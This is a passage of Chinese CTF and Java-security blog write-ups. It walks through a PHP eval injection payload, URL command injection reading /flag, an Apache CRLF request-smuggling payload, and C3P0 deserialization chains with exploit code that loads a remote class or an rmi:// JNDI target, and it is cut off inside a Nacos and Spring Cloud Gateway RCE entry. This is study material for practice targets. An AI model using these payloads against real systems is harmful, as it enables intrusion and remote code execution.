alt="image-20230604174519826"></p><p>这里有个问题就是要把时间戳给删掉，，不然会构造失败</p><p><img src="../images/image-20230604174615095.png" alt="image-20230604174615095"></p><h2 id="MyWeb"><a href="#MyWeb" class="headerlink" title="MyWeb"></a>MyWeb</h2><p><strong>题目描述：试试我的JSON解析工具。</strong></p><h4 id="json的解释"><a href="#json的解释" class="headerlink" title="json的解释"></a>json的解释</h4><p><img src="../images/image-20230604181116728.png" alt="image-20230604181116728"></p><p>实际存储的json是这样的  输出的时候</p><p><img src="../images/image-20230604181140589.png" alt="image-20230604181140589"></p><p>然后进行测试一下看传入的json是咋样的</p><p><img src="../images/image-20230604181347889.png" alt="image-20230604181347889"></p><p><img src="../images/image-20230604181423212.png" alt="image-20230604181423212"></p><p><strong>然后看本地存储的样子</strong></p><p><img src="../images/image-20230604181500207.png" alt="image-20230604181500207"></p><p><strong>这样我们就理解了这个json存储的过了，那么我们就可以进行构造来绕过了</strong></p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p><strong>题目代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="comment">// 写了个网页存储JSON数据，但是还不会处理json格式，这样处理应该没有什么问题吧</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;save&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;]&#x27;</span>, <span class="string">&quot;, &#x27;<span class="subst">$value</span>&#x27;]&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;read&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$data = &#x27;</span> . <span class="variable">$data</span> . <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里审计一手代码，就是一个save和read的过程，我们要想eval的东西是我们想执行的，那就必须破坏它的结构，<strong>那就复制下来在本地测试测试</strong>，怎么才能闭合原有结构，让危险代码逃逸</p><p><code>addslashes</code> 这个函数是用来进行sql转义的用的</p><p><img src="../images/image-20230604175647010.png" alt="image-20230604175647010"></p><p>跟据在上面讲的内容之后，我们知道了json存储的格式是咋样的</p><p><img src="../images/image-20230604181625002.png" alt="image-20230604181625002"></p><p>我们最后要执行的是<code>eval(&#39;$data = &#39; . $data . &#39;;&#39;);</code></p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?mode=save&amp;value=]//%0a;&lt;your_php_code&gt;;//</span><br></pre></td></tr></table></figure><p>首先是这个<code>]</code>这个是为了闭合前面的<code>[</code>然后导致后面的内容可以逃逸出来</p><p>(<strong>这里虽然说json格式会报错，但是<code>file_get_contents</code>是会输出这个json文件里的全部内容的</strong>)</p><p><strong>然后<code>]//%0a;</code>这个是会注释第一行的内容，然后换到第二行</strong></p><p>然后<code>&lt;your_php_code&gt;;//</code><strong>这个是会执行我们设置的代码然后注释掉后面的代码</strong></p><p><img src="../images/image-20230604185620831.png" alt="image-20230604185620831"></p><p>这就是传进去的样子</p><p><strong>接着传值获取环境变量</strong></p><p><img src="../images/image-20230604185826603.png" alt="image-20230604185826603"></p><p><strong>第二行就会执行代码了</strong></p><p><strong>像下面的格式也是可以进行代码执行的</strong>(可以执行<strong>phpinfo()</strong>)</p><p><img src="../images/image-20230604190446540.png" alt="image-20230604190446540"></p><p><strong>总结</strong></p><ul><li>就是利用换行绕过和注释来进行绕过    并且就是这里的话学到了一点就是(<strong>就是有eval的时候并不用得一直盯着他来执行，可以换种思路来</strong>)</li></ul><p>​                      (————————————就像这道题一样————————————)</p><ul><li><strong>原本就是php代码  把eval结构破坏之后进行换到第二行然后就可以执行自己想执行的代码了</strong></li></ul><p><strong>就是以后遇到可以本地执行的代码可以拷贝下来到本地尝试进行解题</strong></p><h2 id="ez-factors"><a href="#ez-factors" class="headerlink" title="ez_factors"></a>ez_factors</h2><p>题目描述：原生 Linux 因数爆破工具。flag在根目录</p><p>(<strong>这题又是使用<code>%0a</code>来进行绕过从而进行命令执行的</strong>)</p><ul><li>这个%0a确实好多题的时候的解</li></ul><p><img src="../images/image-20230604201247967.png" alt="image-20230604201247967"></p><p>点进去的发现这里会对这个数字进行分解，所以就猜想这里进行了<strong>命令执行</strong></p><p>但是在数字后拼接命令的时候发现并不能同时执行(<strong>那么我们就考虑一下使用别的执行来让其两个命令同时</strong>)</p><p>这里的话 <code>; | &amp; %0a</code>都能让其执行</p><p>但是经过多次尝试，发现这里只能返回数字，那么我们就可以<strong>考虑让输出结果以八进制进行输出</strong></p><p><code>od</code>这个命令就符合我们的预期</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/factors/<span class="number">9</span>;od%<span class="number">20</span>-b%<span class="number">20</span>%<span class="number">2</span>fflag</span><br></pre></td></tr></table></figure><p>这里进行必须进行url编码，不然会执行失败</p><p><img src="../images/image-20230604201858291.png" alt="image-20230604201858291"></p><p><img src="../images/image-20230604201815683.png" alt="image-20230604201815683"></p><p>输出全是八进制的数字(<strong>因为都是三个数字在一起</strong>)</p><p><img src="../images/image-20230604202021231.png" alt="image-20230604202021231"></p><p><strong>总结</strong></p><p><strong>题目挺新颖的，只允许输出数字，并且是在url处进行命令执行，然后在用8进制将结果输出</strong></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="../images/image-20230604205358343.png" alt="image-20230604205358343"></p><p>这个一看就是考察<code>apache</code>的漏洞     然后当时是去查了这个版本，然后找到了一个CVE,但是不懂咋用，看了赛后解，才发现我忘记收集这个<code>apache</code>的配置文件了</p><p><a href="https://xz.aliyun.com/t/12345#toc-7">apache请求走私 CVE-2023-25690</a></p><p>然后去读取配置文件</p><p><img src="../images/image-20230604205736740.png" alt="image-20230604205736740"></p><p><img src="../images/image-20230604205748044.png" alt="image-20230604205748044"></p><p>在配置文件里发现了关键信息</p><p>做了个proxy转发，猜测flag直接就在转发后当前目录flag.txt里（瞎猜就是了，大不了多试试）,利用CRLF注入，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nssctf/<span class="number">0</span>%<span class="number">20</span>HTTP/<span class="number">1.1</span>%<span class="number">0</span>d%<span class="number">0</span>aHost:%<span class="number">20</span>localhost%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>aGET%<span class="number">20</span>/flag.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230604210535493.png" alt="image-20230604210535493"></p><p>就是根据这个payload和在上面查看的apache配置文件一起得出的结果</p><p><img src="../images/image-20230604210812996.png" alt="image-20230604210812996"></p><p><strong>可惜了   当时没想到这个配置文件</strong></p><h2 id="TimeTrcer"><a href="#TimeTrcer" class="headerlink" title="TimeTrcer"></a>TimeTrcer</h2><p><img src="../images/image-20230604202607093.png" alt="image-20230604202607093"></p><p>上面是这题的考点</p>]]></content>
      
      
      
        <tags>
            
            <tag> NSS-round13-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全之C3P0链利用与分析</title>
      <link href="/posts/35b383c2.html"/>
      <url>/posts/35b383c2.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/nice0e3/p/15058285.html#http-base%E4%BD%BF%E7%94%A8">参考文章</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>C3P0是JDBC的一个连接池组件</strong></p><ul><li><code>JDBC</code></li></ul><p>“JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。<br>使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。”</p><ul><li><strong>连接池</strong></li></ul><p>“我们在讲多线程的时候说过，创建线程是一个昂贵的操作，如果有大量的小任务需要执行，并且频繁地创建和销毁线程，实际上会消耗大量的系统资源，往往创建和消耗线程所耗费的时间比执行任务的时间还长，所以，为了提高效率，可以用线程池。<br>类似的，在执行JDBC的增删改查的操作时，如果每一次操作都来一次打开连接，操作，关闭连接，那么创建和销毁JDBC连接的开销就太大了。为了避免频繁地创建和销毁JDBC连接，我们可以通过连接池（Connection Pool）复用已经创建好的连接。”</p><ul><li><code>C3p0</code></li></ul><p><strong>C3P0是</strong>一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。 使用它的开源项目有Hibernate、Spring等。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><ul><li><p><strong>URLClassLoader   也叫   http base链</strong></p></li><li><p><strong>hex base</strong></p></li><li><strong>jndi</strong></li></ul><p>一共就是这三个利用链(<strong>下面是利用链分析</strong>)</p><h3 id="URLClassLoader-http-base"><a href="#URLClassLoader-http-base" class="headerlink" title="URLClassLoader(http base)"></a>URLClassLoader(http base)</h3><p>先搭建环境来测试</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先导入maven</p><p>然后写个恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>特别重要的一点就是别在idea里边进行编译,还有就是编译的时候别加上package </strong> (血的教训)</p><p>接着写个demo(记得导入<strong>ysoserial.jar</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> ysoserial.Serializer;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.C3P0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// PayloadRunner.run(C3P0.class, args);</span></span><br><span class="line">        <span class="type">C3P0</span> <span class="variable">c3P0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C3P0</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> c3P0.getObject(<span class="string">&quot;http://127.0.0.1:8000/:calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] serialize = Serializer.serialize(object);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialize);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在编译的文件目录下开个python服务</p><p><img src="../images/image-20230607101451858.png" alt="image-20230607101451858"></p><p><img src="../images/image-20230607101546804.png" alt="image-20230607101546804"></p><h4 id="分析链子"><a href="#分析链子" class="headerlink" title="分析链子"></a>分析链子</h4><p><img src="../images/image-20230607103131303.png" alt="image-20230607103131303"></p><p>跟进<code>getObject</code>这个类</p><p><img src="../images/image-20230607103210687.png" alt="image-20230607103210687"></p><p>这里话是对我们传进的url进行分解  分解为url和classname</p><p>反射创建了一个<code>PoolBackedDataSource</code>实例对象，然后反射将<code>connectionPoolDataSource</code>的值设置为<code>PoolSource</code>类的实例，传递<code>className</code>和<code>url</code>参数。即我们传入的远程地址和类名。</p><p><strong>然后我们直接来跟这个反序列化入口</strong><code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject</code></p><p><img src="../images/image-20230607105927591.png" alt="image-20230607105927591"></p><p>在入口点打个断点进行分析</p><p><img src="../images/image-20230607110021890.png" alt="image-20230607110021890"></p><p>判断反序列化的参数类型是否是<code>IndirectlySerialized</code>,是的话进入<code>getobject()</code>方法</p><p><img src="../images/image-20230607110134630.png" alt="image-20230607110134630"></p><p>然后接着进入这个类里边</p><p><img src="../images/image-20230607110257304.png" alt="image-20230607110257304"></p><p>获取到类名和url</p><p><img src="../images/image-20230607110405794.png" alt="image-20230607110405794"></p><p>然后接着进入到这个<code>URLClassLoader</code>方法   </p><p>关键点来了</p><p><img src="../images/image-20230607110520336.png" alt="image-20230607110520336"></p><p>一般来说这个三个方法是成对出现的  </p><p>(<strong>这里的一些参数能直接获取到是因为在序列化的时候进行了赋值</strong>)    <a href="https://www.cnblogs.com/nice0e3/p/15058285.html#http-base%E4%BD%BF%E7%94%A8">参考文章</a></p><p><code>ForName</code>是为了初始化    <code>newInstance</code>是为了实例化  因为我们构造的恶意代码是个静态代码块，在初始话的时候就会自动执行了，不需要下面的实例化了</p><p><img src="../images/image-20230607110951148.png" alt="image-20230607110951148"></p><p>这里话要重新实例化一遍URL是因为这里的<code>URLClassloader</code>需要接收的参数是<code>URL</code>数组</p><p><strong>Gadget</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject</span><br><span class="line">-&gt;ReferenceIndirector.getObject()</span><br><span class="line">-&gt;ReferenceableUtils.referenceToObject</span><br><span class="line">(然后在referenceToObject#forname执行代码)</span><br></pre></td></tr></table></figure><h3 id="jndi"><a href="#jndi" class="headerlink" title="jndi"></a>jndi</h3><p><img src="../images/image-20230607113223538.png" alt="image-20230607113223538"></p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">c3p_jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">JndiRefConnectionPoolDataSource</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JndiRefConnectionPoolDataSource</span>();</span><br><span class="line">        exp.setJndiName(<span class="string">&quot;rmi://127.0.0.1:10099/exp&quot;</span>);</span><br><span class="line">        exp.setLoginTimeout(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    fastjson exp:</span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;object\&quot;:[\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,&#123;\&quot;jndiName\&quot;:\&quot;rmi://localhost:8088/Exploit\&quot;, \&quot;loginTimeout\&quot;:0&#125;]&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="分析链子-1"><a href="#分析链子-1" class="headerlink" title="分析链子"></a>分析链子</h4><p>因为这个是可以用来打fastjson的，所以说这里的关键就是<code>JndiRefConnectionPoolDataSource</code>里面的set方法</p><p><img src="../images/image-20230607152255721.png" alt="image-20230607152255721"></p><p>然后跟进这个方法</p><p><img src="../images/image-20230607153202545.png" alt="image-20230607153202545"></p><p>然后发现会给<code>JndiName</code>赋值之后会调用下图的这个方法</p><p><img src="../images/image-20230607153347350.png" alt="image-20230607153347350"></p><p><strong>在这个jndi给赋值之后</strong></p><p>接着调用另一个set方法 </p><p><img src="../images/image-20230607154707647.png" alt="image-20230607154707647"></p><p>然后调用到<code>WrapperConnectionPoolDataSource</code>的<code>setLoginTimeout</code>的方法里面</p><p><img src="../images/image-20230607154728229.png" alt="image-20230607154728229"></p><p>这里调用到这个里的方法是因为  <code>wcpds</code>是属于这个类的</p><p><img src="../images/image-20230607154857985.png" alt="image-20230607154857985"></p><p>然后就接着跳到了这个类的<code>JndiRefForwardingDataSource</code>的<code>setLoginTimeout</code>方法里</p><p><img src="../images/image-20230607155444372.png" alt="image-20230607155444372"></p><p>重点就是这个<code>inner()</code>方法了   跟进他</p><p><img src="../images/image-20230607155536695.png" alt="image-20230607155536695"></p><p>然后发现它会调用这个<code>dereference</code>方法   跟进去</p><p><img src="../images/image-20230607155629666.png" alt="image-20230607155629666"></p><p>最后就会在这个<code>dereference()</code>方法里调用lookup方法来执行我的rmi恶意服务代码</p><p><strong>最后测试一下代码可行性</strong></p><p><img src="../images/image-20230607160745876.png" alt="image-20230607160745876"></p><p>在kali搭建一个rmi恶意服务</p><p><img src="../images/image-20230607160832728.png" alt="image-20230607160832728"></p><p>发现是会弹计算器的    </p><h3 id="hex-base-二次反序列化"><a href="#hex-base-二次反序列化" class="headerlink" title="hex base(二次反序列化)"></a>hex base(二次反序列化)</h3><p>这个方法可以用来进行二次反序列化的绕过</p><p>如果不出网，而且是<code>fastjson</code>或<code>jackson</code>的情况，可以用这个Gadget。</p><p>这里其实就是常听到的就是用C3P0二次反序列化打Fastjson，因为像Fastjson和Jackson在反序列化时都会触发setter方法的执行，而C3P0中<code>userOverridesAsString</code>的setter会将<code>HexAsciiSerializedMap</code>开头的hex字符串进行解码再去触发Java原生的反序列化</p><ul><li>其实简单来说就是这个序列化的时候会先生成一堆16进制的字符串，然后这些字符串就可以绕过黑名单检测(<strong>这就是二次反序列化的用法</strong>)</li></ul><p>先写个demo来触发</p><p><img src="../images/image-20230608155736546.png" alt="image-20230608155736546"></p><p>(<strong>注意这里绕过<code>HexAsciiSerializedMap</code>后面跟着的16进制字符串不对的话，是不会进入到序列化那个类里边的，在转化为字节流的时候就会告诉你失败</strong>)</p><p>接着来到这个类里边</p><p><img src="../images/image-20230608155946848.png" alt="image-20230608155946848"></p><p>给<code>this.userOverridesAsString</code>赋值</p><p>然后最后会调用到这个函数</p><p><img src="../images/image-20230608160020522.png" alt="image-20230608160020522"></p><p><img src="../images/image-20230608160048629.png" alt="image-20230608160048629"></p><p>这里的话会先截取<code>HexAsciiSerializedMap</code>后面跟着的16进制，然后将其转化为字节数组</p><p><img src="../images/image-20230608160149510.png" alt="image-20230608160149510"></p><p>然后接着进入到这个<code>formByteArray</code>函数里</p><p><img src="../images/image-20230608160228255.png" alt="image-20230608160228255"></p><p>接着进入到这个<code>deserializeFromByteArray</code>这个函数里</p><p><img src="../images/image-20230608160333740.png" alt="image-20230608160333740"></p><p>最后在这里进行反序列化</p><p>(所以说利用方法就是将序列化的结果转化为16进制放在<strong><code>HexAsciiSerializedMap</code></strong>的后面，然后传入<code>wrapperConnectionPoolDataSource.setUserOverridesAsString()</code>)</p><p>这样就可以进行黑名单绕过了</p><p>在<code>fastjson</code>，<code>jackson</code>等环镜下，<code>userOverridesAsString</code>属性可控，导致可以从其setter方法<code>setuserOverridesAsString</code>开始到最后<code>deserializeFromByteArray</code>对其调用<code>readObject</code>进行反序列化，造成反序列化漏洞</p><p>这里的有一道题会来讲解这个c3p0二次反序列化的用法</p><p><a href="https://ke1nys.github.io/posts/450c467.html#babyja-2023%E9%BB%91%E7%9B%BE%E6%9D%AF">babyja 黑盾杯 2023</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全之C3P0链利用与分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>show-php反序列化</title>
      <link href="/posts/edbe2217.html"/>
      <url>/posts/edbe2217.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8e1146f04b93e77166a33373824489a098ba022a6c1c33e5f8a4ec931eff0429"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> show-php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn-2023-web</title>
      <link href="/posts/f67bf28b.html"/>
      <url>/posts/f67bf28b.html</url>
      
        <content type="html"><![CDATA[<p>都是参考别人的wp做的复现</p><h2 id="Unzip-软链接"><a href="#Unzip-软链接" class="headerlink" title="Unzip(软链接)"></a>Unzip(软链接)</h2><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//only this!</span></span><br></pre></td></tr></table></figure><p>这里考察的是<strong>软链接</strong> </p><p><a href="https://cloud.tencent.com/developer/article/2287412?from=15425&amp;areaSource=102001.1&amp;traceId=1BW57UqobpgO9lrIzxmpk">软链接连接目录</a></p><p><img src="../images/image-20230531111039582.png" alt="image-20230531111039582"></p><p>跟着这里做来上传压缩文件就行了</p><h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p><img src="../images/image-20230531104951995.png" alt="image-20230531104951995"></p><p>题目给了一个界面，但是如何我们就去网上搜索看是否存在漏洞这个</p><p>然后找到了一个漏洞</p><p><a href="https://cloud.tencent.com/developer/article/2070445">nacos未授权-CVE-2021-29441复现</a>    就是可以给后台加一个用户(<strong>用户名和密码自己可以设置</strong>)</p><p><img src="../images/image-20230531105226696.png" alt="image-20230531105226696"></p><p>然后进行登录</p><p><img src="../images/image-20230531105329173.png" alt="image-20230531105329173"></p><p>进入后台之后，这里就得用到jar包里的内容了</p><p><img src="../images/image-20230531105350138.png" alt="image-20230531105350138"></p><p>这些内容就是关键了</p><p><img src="../images/image-20230531105433101.png" alt="image-20230531105433101"></p><p>然后跟着里面进行操作就行了</p><p><a href="https://xz.aliyun.com/t/11493">Nacos结合Spring Cloud Gateway RCE利用</a></p><p><img src="../images/image-20230531105513222.png" alt="image-20230531105513222"></p><p>因为这里给的是yaml,而jar包里要求的是json</p><p>所以我们找一个在线网站来进行转化</p><p><img src="../images/image-20230531105603112.png" alt="image-20230531105603112"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;spring&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cloud&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;gateway&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exam&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;order&quot;</span><span 